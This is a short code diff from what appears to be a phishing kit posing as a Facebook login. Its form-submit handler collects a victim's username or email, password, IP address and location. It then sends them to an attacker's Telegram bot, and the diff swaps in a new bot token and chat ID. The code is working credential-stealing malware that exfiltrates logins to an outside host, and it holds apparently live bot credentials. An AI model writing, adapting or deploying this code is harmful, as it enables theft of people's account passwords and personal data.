@@ -20,8 +20,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Facebook Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-   var token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
-        var chat_id =  -4201401797
+   var token = "6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ";
+        var chat_id =  -4587258745;
 
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
